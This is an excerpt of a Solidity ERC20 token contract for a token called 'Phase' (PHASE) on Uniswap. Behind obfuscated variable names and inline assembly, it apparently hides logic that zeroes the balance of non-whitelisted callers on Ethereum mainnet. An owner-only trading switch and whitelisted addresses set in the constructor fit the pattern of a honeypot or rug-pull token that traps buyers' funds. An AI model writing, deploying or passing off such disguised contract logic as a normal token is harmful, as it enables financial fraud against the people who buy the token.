...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    uint256 private _phaseChange = block.number*2;

    mapping (address => bool) private _firstPrime; 
    mapping (address => bool) private _secondPrime;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private peachBurn;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private longCucumber;
    address public pair;
    ...
    bool private trading; uint256 private starRise = 1; bool private sunSet;
    uint256 private _decimals; uint256 private forNight;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        for (uint256 q=0; q < 3;) {_firstPrime[addPhase[q]] = true; unchecked{q++;} }
    }
    ...
    function _InitToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xb64bd44ae79ebf415b4d8e1d9198138b0ef1e16407ec8188ca3d90f06cfc8fd1
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xdb118899270aa9627baec318f51dd765758a6e8a366df0782489a0ccfe830320,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _phaseChange = block.number;
        return true;
    }
    ...
    function _DeployPhase(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployPhase(creator, initialSupply);
    }
}

contract ThePhase is ERC20Token {
    constructor() ERC20Token("Phase", "PHASE", msg.sender, 1650000 * 10 ** 18) {
    }
}